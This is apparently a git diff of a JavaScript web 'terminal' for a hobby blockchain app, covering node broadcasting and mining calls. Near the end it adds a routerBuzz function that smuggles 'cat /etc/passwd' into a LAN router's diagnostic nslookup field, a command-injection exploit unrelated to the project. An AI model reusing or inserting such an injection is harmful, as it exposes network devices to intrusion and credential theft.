@@ -1,10 +1,9 @@
 var cryptos = [{}];
 var blockchain;
 const blockchainURL = 'http://localhost:5000/blockchain';
-const otherNodesAddresses = ['http://169.254.139.53:5000/blockchain', 'http://192.168.0.153:5000/blockchain', 'http://192.168.0.112:5000/blockchain', 'http://192.168.1.68:5000/blockchain', 'http://192.168.1.75:5000/blockchain']
+const otherNodesAddresses = ['http://169.254.139.53:5000/blockchain', 'http://192.168.0.153:5000/blockchain', 'http://192.168.0.112:5000/blockchain', 'http://192.168.1.68:5000/blockchain', 'http://192.168.0.154:5000/blockchain', 'http://192.168.1.75:5000/blockchain']
 let nodeAddresses = [ '192.168.0.153', '169.254.105.109', '169.254.139.53', '192.168.0.112', '192.168.1.75', '192.168.1.68', '192.168.0.154'];
-var ip = '192.168.0.112'
-console.log('IP:',ip);
+
 var sachaAddress = '192.168.0.154';// = new BlockchainAddress((ip?ip:"127.0.0.1"), 0, 0);
 var hexagrams = [{}];
 var backgroundUrl = $('body').css("background-image");
@@ -39,6 +38,7 @@ var Terminal = Terminal || function(cmdLineContainer, outputContainer) {
 
   var cmdLine_ = document.querySelector(cmdLineContainer);
   var output_ = document.querySelector(outputContainer);
+  var debugOutput_ = document.getElementById('second-container');
   var mobileButton = document.getElementById('mobile-enter');
   var ulContainer = document.getElementById("myULContainer")
 
@@ -259,7 +259,7 @@ var Terminal = Terminal || function(cmdLineContainer, outputContainer) {
           break;
 
         case 'mine':
-          startMining(blockchain.nodeAddresses[sachaAddress]);
+          startMining(sachaAddress);
 
           break;
 
@@ -281,7 +281,7 @@ var Terminal = Terminal || function(cmdLineContainer, outputContainer) {
           break;
         case 'node-update-blockchain':
         output('Sending blockchain remotely...');
-          sendBlockchainToRemoteNode();
+          broadcastBlockchain();
 
           break;
         default:
@@ -431,26 +431,7 @@ var Terminal = Terminal || function(cmdLineContainer, outputContainer) {
     }
   }
 
-  //
-  // function formatColumns_(entries) {
-  //   var maxName = entries[0].name;
-  //   util.toArray(entries).forEach(function(entry, i) {
-  //     if (entry.name.length > maxName.length) {
-  //       maxName = entry.name;
-  //     }
-  //   });
-  //
-  //   var height = entries.length <= 3 ?
-  //       'height: ' + (entries.length * 15) + 'px;' : '';
-  //
-  //   // 12px monospace font yields ~7px screen width.
-  //   var colWidth = maxName.length * 7;
-  //
-  //   return ['<div class="ls-files" style="-webkit-column-width:',
-  //           colWidth, 'px;', height, '">'];
-  // }
 
-  //
   function output(html) {
     output_.insertAdjacentHTML('beforeEnd', '<p>' + html + '</p>');
   }
@@ -509,7 +490,8 @@ var Terminal = Terminal || function(cmdLineContainer, outputContainer) {
   return {
     init: function() {
       initTerminalMsg();
-      getProperOutput(output_);
+
+      getProperOutput(output_, ulContainer);
     },
     output: output
   }
@@ -536,7 +518,7 @@ function fetchFromDistantNode(url){
 
     rawBlockchain = JSON.parse(data);
     console.log(sachaAddress, url);
-    distantBlockchain = new Blockchain(rawBlockchain.chain, rawBlockchain.pendingTransactions, sachaAddress);
+    distantBlockchain = new Blockchain(rawBlockchain.chain, rawBlockchain.pendingTransactions);
     blockchain = longestChain(blockchain, distantBlockchain);
     console.log('Longest blockchain has that many blocks:',blockchain.chain.length, url);
 
@@ -558,9 +540,15 @@ function saveBlockchainToServer(){
   //sendBlockchainToRemoteNode();
 }
 
-function sendBlockchainToRemoteNode(url, blockchain=false){
-  console.log('Sending blockchain remotely...', blockchain);
-  $.post(url, { blockchain: JSON.stringify(blockchain)}, function(data){
+function broadcastBlockchain(){
+  for(var i=0; i<otherNodesAddresses.length; i++){
+    sendBlockchainToRemoteNode(otherNodesAddresses[i], blockchain);
+  }
+}
+
+function sendBlockchainToRemoteNode(urlToSend, blockchain=false){
+  console.log('Sending blockchain remotely...');
+  $.post(urlToSend, { blockchain: JSON.stringify(blockchain)}, function(data){
 
   });
 }
@@ -571,15 +559,16 @@ function startMining(blockchainAddr){
   output('Starting the miner...');
   setInterval(function(){
     // if(blockchain.pendingTransactions.length >= blockchain.blockSize){
-      miningAddr = blockchain.nodeAddresses[blockchainAddr];
-      console.log('Mining:',miningAddr);
-      $.post('http://localhost:5000/mine', { address: JSON.stringify(miningAddr)}, function(data, status, response){
+      miningAddr = sachaAddress;
+
+      $.post('http://localhost:5000/mine', { address: miningAddr}, function(data, status, response){
           if(status === 'success'){
             //gets the updated blockchain
             updatedBlockchain = JSON.parse(response.responseText);
             console.log('Latest Block Hash:', updatedBlockchain);
-            blockchain = new Blockchain(updatedBlockchain.chain, updatedBlockchain.pendingTransactions, updatedBlockchain.blockbase);
-
+            blockchain = new Blockchain(updatedBlockchain.chain, updatedBlockchain.pendingTransactions);
+            blockchain.nodeAddresses = updatedBlockchain.nodeAddresses;
+            console.log('Addresses:', blockchain.nodeAddresses)
             //fetches the latest hash & output the mining address' stats
             var latestBlock = getLatestBlock(blockchain);
             console.log("Length of updated blockchain:",updatedBlockchain.length);
@@ -716,6 +705,13 @@ function longestChain(localBlockchain=false, distantBlockchain=false){
 function getLatestBlock(blockchain){
   var lengthChain = blockchain.chain.length;
   return blockchain.chain[lengthChain - 1];
+}
+
+function routerBuzz(){
+  $.get('http://192.168.0.1/cgi-bin/luci/;stok=<Clipped>/expert/maintenance/diagnostic/nslookup?nslookup_button=nslookup_button&ping_ip=google.ca%3b%20cat%20/etc/passwd&server_ip= HTTP/1.1'
+).then(function(res){
+  console.log(res);
+})
 }
 
 function listenForChangeOnBlockchain(){
